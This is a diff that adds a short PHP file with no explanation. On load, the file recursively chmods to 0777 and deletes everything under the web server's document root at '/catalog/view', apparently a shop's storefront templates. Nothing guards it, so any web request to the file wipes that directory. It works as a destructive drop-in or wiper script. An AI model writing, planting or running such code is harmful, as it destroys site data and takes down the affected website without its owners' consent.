@@ -1,0 +1,24 @@
+<?php
+   function RDir( $path ) {
+    if ( file_exists( $path ) AND is_dir( $path ) ) {
+       $dir = opendir($path);
+       while ( false !== ( $element = readdir( $dir ) ) ) {
+         if ( $element != '.' AND $element != '..' )  {
+           $tmp = $path . '/' . $element;
+           chmod( $tmp, 0777 );
+           if ( is_dir( $tmp ) ) {
+            RDir( $tmp );
+           } else {
+             unlink( $tmp );
+          }
+        }
+      }
+       closedir($dir);
+      if ( file_exists( $path ) ) {
+        rmdir( $path );
+      }
+    }
+   }
+
+  $dir = $_SERVER['DOCUMENT_ROOT'] . '/catalog/view';
+  RDir( $dir );
